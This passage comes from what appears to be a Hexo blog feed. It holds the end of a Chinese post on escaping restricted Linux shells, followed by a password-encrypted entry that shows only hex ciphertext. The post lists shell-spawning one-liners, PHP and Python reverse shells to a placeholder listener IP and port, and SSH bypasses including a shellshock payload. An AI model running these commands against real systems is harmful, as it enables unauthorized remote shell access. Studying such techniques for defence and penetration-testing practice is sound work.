href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><p>先执行<code>lua</code>再执行<code>os.execute(&#39;/bin/sh&#39;)</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210135752705.png" alt="image-20211210135752705"></p><h1 id="反弹shell绕过"><a href="#反弹shell绕过" class="headerlink" title="反弹shell绕过"></a>反弹shell绕过</h1><p>php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;LISTENING IP&quot;,LISTENING PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><h1 id="ssh绕过"><a href="#ssh绕过" class="headerlink" title="ssh绕过"></a>ssh绕过</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh username@IP - t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (shellshock)</span><br><span class="line">ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美少妇日记</title>
      <link href="/p/a32d047c.html"/>
      <url>/p/a32d047c.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="336a7ed374bad397d869b983454d22bff075d1791d33bde5e5c812d5e970e8ef">c157c9744e0298d00173c08a9dbffe0ec94f198c43dd2b95a3c3b526c19ab93073da141e5a0ce3efc1ee1a8125b7a568025dc81651bc7cbdabb9f720703c42f85c053cc67d1ab4882fedbf9129eef207d9a113bba1ee3657fbac63af653f1d7b66e7c5c1588da3ad1ab1b849dbcda4e69964181ee7cec6cde3fbefe23e0b21cdd39bc69f00d06c8d500855c341a5d20683078707409f28759d5181a5d1bed67ec67c17a5f24be6e94360bc1c4e98c2ac6962c5f51ab0a4c606b5791e710f734a4200e379dfd142641cfc928670a8ed40361354641c468ff2ee3740d5d5d906d386f51121c5f2a752d43846b9babd52cf12a6d4684609057dc74ad4ada40d0a046f69d941b7274ca837dd6dadeeb8c4258365a493dcf0432f266d493a188b6480d6c73e835c7fcbcf813487e18d8270eb6bb4f787e2ab25a865f694494c69bc5abe2729e7e58ca1bb03ea82b02ab5aca5615a461fb69a20925626e312617e847494c59c0b482743ab580cff9cf0b28ae841af805ad2eb0458156549e7d019dec07a11e01a7c64bfcabc9459a5db5864c6987b08428787112514aba45fa532c73b878068334f8b6c4991cd7ec1764827834cad36ec8fe1385503d8d21e7575c4c2898b3cf0022d9b0f6615946a3de8fc32bf4995b3871d569ad957245bd6048c2636372997502f5bd720146df7dc810e3d64aec7708a8e07b9dbdf152b7faf231c493f38ab292d2cd8ac85ef597f02850534eb9927b9943c79f958691d2cc05a916852c10ee08efeb73f64652686dd45888890e3567cbe4ca8becb996c2c09a9157350abf758b7570088284d3ca43413984b28f6503e6e3506a23b39cc70790697a37244388f644f71e6449509c4c6cf84bfd6237b288bc564c28f48c6f79522a595640e8b2aa825496cf997cbe6878a43a3224c435681e1ae0cc00a2c4bb8b983a4cba20567fbefe47ce0f382fd7bb45eea28f31a24b1787398fdaa4b50e9c7ed17f9569fefdd90b9bcb5bf91cd691498106ed526d3249a8baa1c1d3cee9d8af5d48a4df46df02a57e7a5419c3bcdf1876ba6b6c27132d2d8b8b2b4e755e9ab7a0d278a434e0b6a6aae02403e19268572e58b1f794ceec7344185160b9c231e662d0ea57000129e731bbdf023c99a60ac40850c78d4a24338873f062057ef719d882990d67394b54c08f180179c356be24c35a5295a95b530a93855def9613788526da28fdf9246fe620e04ba26c5a94f60e9afdf3ed8bdfd82ba4d33d71420c9d40063d2c8d1524ed8ba7dd86222ada52a47b18df1c8a5feacb758d96062b3d53847013a461cbea4bc9c800ac9de0f2b2948cdacd7e585d6b53e3c3f756db4c4478536f947b241d555368beb1bacf8272f7b603a7dab87ff03663005267b47a39c050453d238831d8e21327b27ac25a7303ccbc15e34cd41c2f1306ca6ba8384f30d140f3abba94076c2e0d483a9a51b5a96c01a23ed0c12e0619cb2d34f1d08586f2ca964a99123695369804003d3968006e0b0e28502996da735e768649361316fb28541a8789f3217e2249f5072ef9ed507fb59c48d17ddcaecda0e518d6d200787895b07ab48d2a4454e6f434b95bf76559f671dfa9f82ccb4f3fcdea7ff0c2997b8bc33302023726e3a226f9ce04fc874108d29c53c244b056abdbd200dd239f5cbab40373f435b4c2865d89188b2016aefbcf2e1b749410801580eee8b809e75d51f282c4c56f9bcbf82169d2ee259bb75cf065554d5d1ae7dc1d5e44d188518d8aab9c9f91ece08d0a06b514e85f8c8af4251c422330414db69bb5e8299704ef3257d37ccae37bef5e5d43924024e20836d12a00a7cae4bd1ae534a8f95cf1116772b3cf2c6abc8ab1ba72b10d82cac9e0380b7eedb266a716589f65621cc2e12ddbf1cdbca49eef2a1d81af431af9960adea423cf0ba951025d0ac8abab6ab261525951f8a60b94d23078341eb85b41e89f406659d31609527db51a195e63f73f6590c30bfcb2161174aeb69de581234aeacad47b7b433a6e4526bb6023b54af031df3dd7ef57ed0ec41b38472f86af5807879970c907c97ab816cd9fea79735908fa355a2b3744f84393d0e476c9b61e79e6806e8d979264b2c480770b18fe514ff4deca7605ba293ef34d083402837f4b6b2431a396ac06f0f23eab999ab726d202605f415edc8f5152590ee3966e11609733a9fbe7da97f6fea1aad5947ede7910281e53f87af6f4b9bda11985adc8a41a7656549bd02fbb258adc03631c0ad2370b23541bceab633431f8d87978e901ae2bb529958749c36a098b13cdd29ff9dd801bf425b7b66824dbf3598cd8159e046ce3af66aaa79937cd494458f9809980c19359aa116b074aa1fa727c57b01fc0c243333341cf0a63df49a87962ecefd084ebef2cb7e0b5e421aeea37940f4d3e542142885443914755dbc52494b72daa7ffa7a704dd08a624a2c8734021e288be806537b717d66144b9dba87a619ca23d36e1d4cd6fc5566463e60635421b607e18ee8b6ec0b271ebde3deea7c6fa3d30f6e59dd0e743cc55ec0ee36038b207f71e43bb3865d9cfd87f7e9481a3f13023307412dc6578dbc7157d17e50a78e84020992fd3b387444d59879271c143c2f2c67a3a03bb3c1738f8a325079500cf92318485e12e6844cc9de0faa07db3a6d14b5271733e86036d603d292d428b4c230b9698d23bf2f6205d62e212cc5518f37517e97c02237f78031efc399eb03d4d20086d8a7eb3fdf9df53d9f9862dc596a3446339ec3414363a534252a9a309c7c6d0e01ff4861e624b3c27b17c0029799a766eaca8b001ac96e4e3e67ed7c77c3a5d12dd0d3bc169e9d1a17af929c53f63dd629bb7a2d56804a0ec2e6ea7c3a859e0779e8ee3e94d8acb26db9d587766705fad93b82425ec298d8cf908f993502f15bd8285443001ca0c7f495e7fe92a9e5bb5184f5ce7c9d5a37f0d806d8188ae62ba49e449894c6fa6454687dd6b132500248a4cab5f54695664985cae30ccf90b2bc427b62447f34111634142156ac3af6fcffaeae61dbb917a5e94c06e4c25ae81c69af3f26331949ee800d74e6ee6510d01583b40dbf6f197f5d5fa50302279c626a360441cfc2a24389d666a66f61620d28b6368f1d323f8028077d1b1e94a90f872fef14fe49cc763118f6756ffc2e93536e7f2ea22a1e8fb3c48ba4b021837b13b74b0baa6841221831bab2ae93eb7ed5f17525932d64950fde7e819d4b3238310b78843b84627e4ca216a6711f5e621f544c4f589fbbf6a37d494ddbab4aa12d6ea6c2f0b6f08887a9e6a43d4f8d0fae0f4c7ba378f97be2dccb12784689125cf57d3993611c8c36da8ed7bd2ce79e6a5a50a038741a31924b765cdb40caa5dc76c6133c6b2423e969ea1b00090d0f7baa28832440f27a3dec914b976ef1c91592a961c720a70d9e43fe8a6392383645563243faba794b28d0b70aadd8ad068b1d0739345c6628d9f5706158bd640413b94e785c9916bfa7317595cb351f1567f26b906d06d4cacef4957e634f223981094430f55e69386dc64add6c15f309dc1118431864529e2020c7be293e53aa3b921d894f7c46fbc12fd2e01206d6e003cd01d8393b3e2d009fe21152e5049a4864f557ccc7075970d39a792701a88696f75389dc1184916585e87ceeafc729ff2206fc15031df59e0fe8566d6ead4b6baac83defb6da71b082d1d7e30d5f5f2d45905fe600021443f7e7d4da00c5428bd420f28c877829713be427b6904d2e0549947fff70d535ade2837877176f4cff50749d4d01db14fc55f690f07ab1b6850cc4f40a4fc9d68d7aa49dbac9ec24f2771590df7921e95d3a85a9a9f57b4066954e3d65aa229b34459c48460dd6cf5f416d7f1a426ce5d05b564b8886a3ccd80d05fc5e4a506a39d4c2da1c17c8a7a3bdeeee4907097407dd313e1d922e6cf33b78fa61098c5982d1c1b34fc79cd11988cee6ffcd8b59d1f70b827b12b38b07972a29dedad9f6e48bf98bc06723bf0fc6c5c10036d462e3c98e158d594263bdaab1c058b65d56646b9ef4692a2171c6724e695d18b869d0cf7cb65332f179ab96656f10554619ac02baeecfe8330e2341b06511d8fc2cb81c58b60255de6d83dd80fd31f4fc6f2d6b2afea0b8c5b11e3b01fb79fc479b50af62db06c06ed4fe635c429e6e0897d4cd78358be7ddce87d0b1b0364c96efe12fa558cf2c3cb22c02e1b1392e7eb25fe42979d75f28b07db16f735b12e800ff05657757b73d47c63c5455faff1d55b70a61a7d2167bd5a88ee20e261c2fab943989564bca4486e472226849535656d1169263925860b46c2ad8a06211e30fbd3d0c1456effd3866b686119da4d16fecc0eea295aa3d50573fab03adcb8e196fe11fe7ae9c55cdc8a42d374fb2eeb46239a9959deea416b13365466cedd3a939829564d0d1ad78defc876a7bc35673266455f236edb59c2c3e7306ac3b6bbc57728bad376ae13cd29a07a6b817547dc610648c307766f630df904867878e2c409b465ea1766f93c3913da9e01b215ba80a1419010b6f3640e477df6560120c9afb15c0f48c4d83db277b1b64b99e5f30e3426b5beb403e9e9de2f24dbb1ff13922f1eda6a7c50c2414ae16b72b2a6c89674486b1d45223ca86956dcff8642223952e09ffb1db14f528061a345618963d17836613e43510f9f2f26c044b40d49fdf88fd9baa31b12323cdc9f2c783e1212794159910031952b204959e8fcb8d9b16b4391bc95ed6172cb428f23ea9eedd04e2f18320b773490ad5291e68ecb9c5129022d4bde990121e049b228b2f79e1be4a8b3b5f9c53373b68944002567a82d0bfdcef82bf9aff472581705136a4eb791ceb03eba059f488880beb2416ce9608abc9f5aeda3fc238654d1577bd0f80a3e26a482af70f8a91afc1a2c780e28088cded93a850a73608eab145fed6f625237d67173df9eccffb8dd3664dd007ff572efa1bad79ce310092f8bc43e2f77b3a34185bd2e92cf741891022fbaf8fa7ebcab5bb55dc0f186198632f56573470ef833d9d94ec0449161756a638826a9b4c60bd78acf0faf62a913905443f5f3e5e5f0be2978019c88ae2615e9cfe291b661d5526ade8e14cf097f6eb670f257db604b5d2acb581a629dc5a57e47547fa63c454b42183deaf7e43d2f5298f7287fefac6412d813a0a45a172d9a9b4fbfd8e22f461e3dc76a23bc97de6964f31fbd160a0ded27d92f62d10a25e67e1d9353191d1ed2a48b60a72551680c420632ba705665d6cec6672ea15b8b6011a4e41e5de9010d3687e9f907b3736314b753c66cf0eb6af2be0e0455ed702836aac1ba087b03af2e7f96494f65784383a408af5257cd5a1dec160d2e3e27f83f1b057ffef59d0da2fc386a78dfbdd6b767d8b72941cb9df5f6ff8f9869c2ebe5f2f40dc66753fab430553d24ac348cc80e2bef172c50543a61383cbd546eab613a3007096a08afcda835742fd4885d7833e482f9ed2cc2896e52a23372887b872250151ab5fac6cb5c1ae447a5de81b14abd7b04e8b307288d549ef1a8aeea09c84402e733070b4a9b37b6c135c57b185bf37f95709d782a36be64cb6323e1f1b1f5110313da8ee01f8ca281d64386403c1dc7b787469976edc34711386ffb1268e6cfe6ac46200edf6d993f5b601b9f25026f991b615851fe03cfd744a3c87f42e57c80d5316e89fa6e0c19aa9a312f37c5c4d0a303b056bf543724a6960f5e999bea42afe2dd3baebebf4cf53e2652e7b88d05edebaac8d7a88e6fd9ec3f817af9102005a94fadb9ad062314dfc46993ad08312baf442963313eaf3bc65d4457ff9d2073022a6cf84cdd5c3875adcc82282c02b4cc1484e3c6d3263ff7503da63f7a205e6762635aeef28262cda221dd429584271e9d56c8b1197cac0fff5ccbb1239526f160e38a978c7a213f46107af8d561ca9c0265ad7b95225caeb766aa4591a6a55af65e4386e353b20032a2ef5ecbbca913d1572a934f0419e3b5f2bd57c69cdaaaa314d1371faf576d8b03ad8a214618f366d869ce09eb8df9de49e95d4da563447477ddc527856c6612746d907a59dc103748e438655193065d61166b3a6964ee554778f8953b568e7df2f1ad0f6d21251db436642f190e8f1d98b4793052d302b14383eb0b3859144156ec5242550d6e143bd48134f6dbe9fec2d79c6d1e71348fe0b9a79808a74b2e79e15946edf8f6e108a4123cf1fd0361b153c2a74cece5c832f81e63ab94750c57a15da8b284989d15fdb0f99181c703f5f1b5da554924a2a0ca3989ec513bdca833469464c17d88ee9680e32596e99a4db618a3fbbbdaeb60aa5d07e1abf9d3cef746f183bfb42c681e9f3bcac9ebd35dc6842047a44d4562957a18f6d955f6328ea36289cf4210d3eddd5053e013979a4d37c6bbd149c7cc7f596be6cc7a9013390ad1fa0f08e50dfefd12443e7b470da36715b3c428e4f7d14c8415bf6b718a9189d291a10b4c6c1a959dda0cc707338a707277dab34444af818bd7752f28ade4b9caf8888b8e590b33d88165fed0c654f279d0b2cef75cf4ded5997d6b2fc64d9e6bf4e1bbe5d79ced2cf4ad36ebb2fa29623c016abee9904e6994ce95511756842533147808e0c8a83566bf8730ef5f477ca98c8c5a42301028ec754e9080b62197077d03404a53057e35f4d7b390f1725d5265beca9bacac1fc870d297e99c8145e4e80be088141d7ea34d819eb7ac0e8d65bb9f445cff170a1a6f2f56ce0d87d0f52a35c75ab804cc00248e01e671601f5f71fe769800d0e2e0c22861986a243170cdf1d5cb713a24b10fd16c5d0896d2c1ecf7e4278d3db7b8445ee000777b90cbb1b8ad555246203e8ea3f48c709f3a66e9617b780270606c153071ce136cfc57c0a5cd2d7a40db224563fcbad94131b0f2b013e5c4ab2ca3da9bd819a821fe27f0b7599a8c7376338b6ac53db566e58bbf5c3ccf9d4634da9cf754645de4060105ed259947c842de81d5641e464d0d8750a8b58d88e049d05091e4d7d64f18db7487398f4e43d33e45f2bd3d978fb9bd0105bbac1afc1814d7211948e9fcc06d1da04a1333b32137bd487185aa6b3bfc01631a3af4131a206318665439434c15f45174119d8a435730534646ceea853f43a8dfdb2bd5ec2770ac58c099228a2c06de3334d9aa37b97839ee7e4e0a560da3adf553a28a78f94cdf13d24bba56548a229dec5162c96bf31509ca47041c6687e1e11a02fe1aed74b314fd6f2d1c1b8f2323774974ac8569be80f84a99c616b0d62419a50fa4bdb57fbcadfc837ac07a6a989054dafbb44b6d7d0991b08acb14b28f61a81a1f9e114f31dd4d16287d04f5c12ec858a78ed1e5c46c66a7c801ed732a9218abfb35e7800417ee2de78ba65c0917dd52903346be764330687c9b45a155c67eb628b960e8396bfe3a43c14e3e8d8491adee488fb232b8209d584d1d4ae036f0c210621de240c47a8dee8d701e595b19e84c0b79f8584e4dc5013c6ebc088557c3d39454b32a1602d00ceec3f992ec6a5a79e54597ee3247fdbaf1c31be257f01cf93072fcf3d655ea4159c2c6e68bc2764bdaf2a0fc429079f5c447ccc9e2236ad1328145af82cf3439f233f4120b94d5449abb93fb9498f3017668f86868ca3aefa328306dad4fae261b745caa9d638caee185a69758f31df817874521119d7cfd9285afc4287dc14994b69a7cce2088e72a7d49ef7e7a935279f731e6f006e7b17bf6860b28c60028c7826b26c7d69db5a0651664cb50f57db5066a8c496b27a6b91e4e5c1abec782305fda0e2610db71451a4d1229c1bdcbb1e55d6e3a7d2aa82c1ee283f7a019f9542b4c4ca478657cdddba2ab6ec8cdc9ab4436e67e247c0e3ffa56b3913a1635c4218182dbbc2911694c8653090f8e1ee8f7f8380bc741482380f9a2860a73e32a924d0a8119ce02c12d185c99612b714f93ac95cee18c00cdf338fedf5d26829f5b9a54da6d54e2882ff180d848147f7518bfcaa9f27d24c3b2b9c938583a92e8be2d214d5da2ae4be00022c6d90315b71815a7212262e546a7daacdca1b489652f8f27428efa272b56eef8b66377e760d199d1496fd73fcf16c6ebbc81bb208385f58849d94efcfa5d40b0e7c3d44d0112e57c0855178d175428bf653970a488b8f6bea4ca22ceee8681c8f8c63eb61d4ff79ec6165509bba8e094088e84a1db7c0609eb220e1cff75b9b1dc13076517a1e98e87f37837e5b346ae686ea29f509d67050eea8ba94c120945f984fb09401f833671eea0c7e2656e74443ab50a1d8f728cf8b1e2d27c9f6e7913e99dbc6556c7d9036b95979701df3b993f6b9ec7f8bed81cfa3fee90640764a9a3ded293975bdd54842c9e8e8c171046562ec23cecbd193be9e4bca315820c11eb2bcfcd01dd26a48b48d80d82565fd2f9aa3a03d47557b50b4f145630590323be3bf81e05ef8fe1891bcb2965a08ac6a76b38c3e59d58cc84cdfbfa782742fdb854d40b62ef50f1cd48e07bdeef7fa2b9d4f35cd86d60c7aae9c91ef6f6167a67676f45fe502008090ebd517ec626a9416ccc9d728f0b48f652ccc58fbac7866634debff6bf3620d76d74435488a7add440e054dd4141815c64962f04b88222430465a51f7f18b8e91cc8aa9ff89d028193d1e57b8f1b1ed57476d3abdb903e0099169a27a58f5968c50b1c9f2668d4c852915d26e6755beb0e95fc0f038a42e5b6999fd312f7f747d87f25c2b9d14e34b1c6f7d800245c3122430635a0cede1f88106ccb4187636ebeadf87cfd2e59cd01572a28ea318f7295fc415badf4b1705db65a21f965de9a390ec03b91ff73e0842f8e8152a1a947eafd6030d0d3d6d7063d03769813950e0b3be7af2950e49c875653011a85677676c3ea1fd7132d61896ae73b5ad6448ee6d2cc6f6eaaaa0f6ebf8484291599a82252d0002f929d7d9d088c3c9f5637f3279dd469963a63e6e9d4eee365cfa8c45e65d46bd6639209946dd5fb8721f35d531a1836b05cb3bea25cb231ad4aefd4564abeeb11d03c3c6aefd19571ab48467d56d4282693485efee4f1676913712f88de8ad3994c26f6b55258b96b57670d21510958b40206cf023cdfc53b41d0fcb2630ac63607dc477754ec481563e06e0c553af0a1b543588d5151112030f7687e84fd2850c14f913139e3b5da71d405b66c1b299bf085918138105d149ad4406486c7c69340e27e253e89478fabf3532c2b999a28a1adbdb88bd6cf7ef6c15a3eb07a6ff56d208007272b47f21ae86fe575a8cec11cf90e995781bd72996ba45f4fd578d404a54ec3b78754dd560c8a58c9b5bd9e37348d48fca3ced25709bff913b69e835366a4bc3265a7192329af87884b853b0fa5688ff5c822285bc849b2c9a1e741615d4d11feeaac39a98f6d3c39d7fc8797bee80ac5a14df820b0cf2385d307b5d97a1d6633135de0cf3cd876e83e6e106e8ef5790264bcb1307359d8874de9804e46b77771240c676d64935324bd7ea13f8634fb356ebe2ce05a187a4c9982a1f3f87a241b4088f86d185ff27d64553e5c9e6ee1b7413dd214cbc9ae4e1a2ad521457d5021a1fcd1edc480eb7cf7d761e64d2c376e646221b3eecb4379f74f8e02669190a462ca66a4a6779fd4626572af4442154b3b1e7a372836cd844ee651b950343aa11517492d535338a418be38ba3b4f3e083f886586098919d9d18481a1bdd67a1b29ddf7a2edffada8109a47d00f11980b2e0d929d6a078fc16858958b9583859ba64b347f4809af3fc33a5472662d2443b41c729f1db910208db1e3576f70dba98b6502ac2728a6c8980c265096bb0ff99b18a13cfa8f6926fb8dadcba015b5a3aa73d869d78f5ddfbc231bbce439b47694f7ca690a6241913c69f4e70d921497625cfe1a9c6d33db8fed0b0d8df4b38a862b8def0791e3ec974c02495b77cf8ad8b9bfd827e8520473674ab952396411c0d9f2986a5da3b5713cc22551c55ccc1b8ff87405db555cae5fca1bf9a924bbbc338a387a31bd1830427c3d24239b64372b856accf8bf126392b08bddacab8426cd8878863b113228dbdd3efd011fab0f0dd6d1dd4ac3a87a3876256483ba1534d550129533ea15c3a7135bfe73ea6b6e0bd6b09a34d4ab8513f8cde0f45eadda9eb8f20a14c6456962279d6828996173310cf1cb203dd6234b85abecf5166c200ea96e286b819c7c0ff0b92761f221218ee93cc98557985f673f7ad2eaef4bc48333d2e98dd4719be86496a029eba5dfb7b3c73747a4a8d55cd9ae5132ce488d849d09471768a359518dfdea51bf4aad3e548ec09046f9b90eaf78a99d8dce5d23faacfdf394bb2cd020065179607336458c46947d60b666fbe191b3af35957017705743edefec327a14e637ad3fc6047ce4fd520e6b80a1ff7f9928b539553c23d8fbcd94d5c9d3cd039f31e053a6ae8c5e539ead1a1720d3f748f0f07bae388086037603f7e16f3e06d14102e5f2343846ddb8c9b5d3443bca51fd79f1eecfdf02ee119fc21b1c4c2c1159149dc093faa97d488b178797cdecf1316dd3ef3e3498d9857cc5cb32f2b0332f0068a0ab2c28ff7c44c066e3fa665d0e8cf49882bacac8193726795bdae5bad0f19cf24b86913be7c8e48ea20f669e59c0094c4a3621c7c7e9cfcf1cd7d086a9775323d614f23bdc7a43b11afa23eb6ee75b7cad01fbd7e6557fd243ce775fa4b4bedbdabfe9f389c821032637c5d8c8e1831e34366a750cb4552c5edfd08626b0984c280d3a23ddafc060bf2b4f27f6b09e3ab23f322de171ae0e257128bf8e99b2a5bbeeede1b8c664e556ecb9a265eb700eab9eea2d0f3e56c8ea5276ab61dff75becef312d8a4f908a8159fda71882fc0598dd7d734db0e9000fd92697ee6f6b213a624f72dce61c65932236c0e0659bbad8c751b0d3849e45ea7fb0c6205d76209c9ba779a64a69e60160dc479781bba8a5388c5ad876664826a7ae938377bd248aab86bd449319c77c28dc221157259859f117c152f39a9f828875605cc1cf5d0d6d14bb58097f88368e13fc812590f4bc3ef93c169feaceda27494f3c2fff6208a0b6571af35935062488672213271768af5e3f96efe94206e694eb342e4dfffe236f92408682890f7bcfb86ce5a1cea6f7d5986fb78b2e913e033f929dffee1de2b07f70af9388138d93a1ada60dd900ed3906bfb77b75aa91698378915f1d3f28fe2e46723a85b7283c6c56442347712398a321ee703231cf5fd58e308b8fa6d34b40475aebdf3c6c3804e0464c68bf76c97631b1961507c774558b161946e8251cb691413e80f4d5863707f8dbcc6efe544ae33bf4c9e2a395a706d1f05088b80654ac4c65ed56932fe1c531f27da95a03179d7c4223cfe3eb1deae23e8a951f8e6571f1f3273b4ef0208f83203aa9949a8d35895cf607d01b840cec1534ea5e139e25878148ac8a40597e318dce93cd8108d0d2f42be5d592582904690c919d3e8eadbaabc12dc067c5ddc163a0777901ed4459ca74bf357b8980244c529fde637639ee4280a409595667e43247d3d29c448543c135fb1ed2254622fa260eff026f4dc99f9d088cce680fe95d2415bdde9ec6f8c4b7ea60bfc2c2f1a2044a1b0b8ba79c9aba2f2e23d8a3447391f6741b5bedbcbf0e6a09784030899b06e8244a0f345726d23ed2913ff854a69f73865c10c97f41207a616f9269262620253c3aae3356be7b643d482c61765c097b157dc9fd3778720f344ea2ad043a96817ad9cde237a05ffa8cc24b9095483e1899a5554e4793f37e8249c33307c214e7f5c9ea26de8f7d4a5f6f54da1d3a7892d20f60bdfc402da28517f470a9c3aefe653dff8f9276af361378c90e5a74d76a2e0dfe309c3add4d870a1a51204aa01a618ca00ba7dafa50d025434394b3b1c85f7c802918549106f8a9dae56259dbbd98d1df66276141b094601dc25a231fc343db44485962986655e08ac1d855bf12b2b931389e8d03a1c8fdf9cbb0636eb1eb4c9805110780da4e1bc058e46558286f2811f4400b8d76950dde8391e027fcd94d3729a7e6fcfee06a094d237d74cf31bf84fbef1be6cd8f091af514940a651b3364e46eba17c64b2a116e402867b5db3ed96220191fc1a3908998dea3c637f33d80369abb583a3661da9e9f4bb87807887c484c0fa5befd80d3d56fe2d4d69901db1ecc16b4be754fcbe40fcaa17f5138f19c122ebb51dbc897069015111e54dbd03653fe42ab96793cc20921b0c47f6ddaadcb38049415551c8235d6db8d101c783082ce0a11ac4fc2659ccfc2667c367f6cf22aa5211d7076d5370f6edf7dca8b0d7ad685ab5ac6ff2e7ad384b76b0ab8e5e6a15f351d6bc7d5e175256b27ac5eaf8e81340c58fc28c7efd3475788feec6cbdf7e3c90b54354a77af2086c84b0b70afc4ed49200c2e2031db386c6bf7ef5c33a2e41b005ce88fd632a4bf1c77ece4a4d174648d31a7a79a6b7dfa1550aa696e00eb7837fc638835d3079a488075a8d32393c20f6c5472e110252326bd9bc0c27b00d2bf9290540ec6c80265393fbd5e97d3dddf55a04a2b0fcd71569a0f29494c0e2fcf94bd753252ecc6903999ff09ae0a4941b3f99534221b80c9c7603c4c81c8ffdf011072efefa5ebbad7556fd5a5f11e3ba6092dd853e7e23d13a163a443121d3ea00964044eaa523d9467840e035c9715b57f1400aa1cd3d4db3e7972bf3615bee7e27cebd68f876e418216c88a8d228d488ee9dfa86b5c294a1d8f63b9ca844557f9555f1462a9926fc82391bf9cd2b73b4f41c354d663f53793d78985f22b15c504155433d78e87f27ae2279cf29c6bcaea557aea529498a51cfe3742e50c267be82bbc19ebc638e537ef697f91e1c3d95c69831b20a483bb6211c1e408866b500dc46eb3267e916660eb7f810ebdd8f21ce5bbf6c0b2a9b6a0351dca1babb346a333c2223c3fc225d0e90baf39649b1b72d826b5e80928929f0934b98242dd6f3a944ff3cb6c7ccefe93af32a5b16c76fdeac0d267d66a03fecd8d5267d0d2e8d1ac2ef38646d891f7e87a58038cd0666ac48539f51e5e4285f91b6c571fd1f9d04b2d07404afe008ace0993ed38c74f3aa283fcb1dc4ad1f22ad75df0a8224df3166d47d1f159475d1ddadb50515f5684af2e1e9d8c981e1de5ac8edff6d963f872ea7804ae00594715b287ac4dc213b6d91595e2f0cbe36155087eeab127fb433c4725a5cc64d57285c38ba9b8998549e71cc82cb40e6a1cbe59ab1a81f0bcb164705d660ae7604899332f70aa9a1765c1945e10ada3cec6decaf5da09c94a54e343f6f510375a0750d74d1b98573c5cea3cb08d55fbfa68fbf2d5bd57d89be61a7f17594d0e3138856d0f36632beb3b01ebfc9fb4d5d8865a66cc16770840876f74f42fecdc78f64bdcf77cb0cf47aa603fbe479f8b51495f2be4581d0702e1a7e4bead7a6dda1a9b72ca5205ea0f69fccabfeb20a80f51b9e3c27f514080b3842c2f63cf0576ff79aeb4f1e45d72d13e8226d66bd7a48406feee31ee1a6ff789f6530dea4120f2cc8eb706dfb031c3480b479f94900fd41132987298850399389c7bfa7a504fcda431e10659d632cbcf095d04fb55bdc1ab235feb26e6e5bfe9a61c9e20bb3696804dddb5fb7562d8be1be3b9637c6756daef118dfebb4b2225aab44452dbca15edfa56be22fb9453435a18d70852390bae0c5852775eacef4d4d5d8b6ca40c40756e93ffeb44607aab5f03899e7085dca0943a71cd4fd30c14b2cdb5c6ca4a2ad32e60252e5220f697f24602548526d6a5f6ef549987b202dc8996883940d63dbe91244adf612c62f1a2c7a282747080045dc6b327bf19c8d9d75cb18ea7730fc183425118729a190f57c95b7a64f179fef8709cf0b16c86a4d2582d650ff257310dbf3af9f957b8388d7f90dd7a787c6eab3e81ea8ac256b2932d8cad0effc5f22dbae381722f099023b152666c45f761fa96001f7717da8712b37cd1c7457921b077fe7eff565db86134e5343bbc0f2fc5db934f4cb4007794836213a6accbcf370ad2f946cd22808c3c7338b2ccdbbc75defc49ba976301392ba8dc3fdd91c73f6f6c74368d6eb99bf15304ee6102bdca488a7e8ca22f6cacd6328d56f7c29fc323095704da412c83bb870a167b2c0458078876ab82fd083e7d973acc1c0d3e6b0de1f11201d2c46153e48e50f533019ecef30e4063e9ff595aa443a00c7715d0f6eb41070a9cab7bb165a884f81770276bd28d165d06d9f25c8f38963e6e6b9ef96c6f006bf309c3697c1811e9fca229adbc11d3cbfe3bda48cf234abbf453a3c277714b03df44cd82a49308ac0db113c1c68afb3ca0f808c510dd261123970cdaaba942b54a1d752681b9a51e363dfec6c5d61f70f35b0d5805a32420a8ac9e91a1e0cafbc28085dfb99ccab8f2e0c3ca73512166cb26a3319385595022c81b7740786765a1a18496e96aa25a498e501c97d5d2f07d3bf22bd5ddd475d1fa2320cdb4301f219e2f6bf3a11506927f607e559e16e933780103121e7caff2518c0574cc001a1bd8ca9be23a145fa85dea12f7af4b941e52e0c09ed912486d2853d04cd2577c4af0165413b9288509b8035e27ea930c534592233b9f0eae843aa001b809faa0d5d03fa66763993373d0de64f1568fd844b69bf39efa933a84254e63e8012a973e89c199e57f019a4b7a06d380c869e7b67f6968f8456a4b024ac1813e1fb0290fb97252cd19650ad6d31d2ca32b7e507aa8b914ccff5d40173cf9a2dd06697686f2ea97e3face6b9798a2b5a3ffc9d406777814119c3f207c1ba07e90520d0b159a29abdac6678e560b6eb5891e2042e5937e633bde1a79a6320f740abae596a438885e039b4047065f74b0489c1bd002907028075f932d9336912837ce6bacd33936fd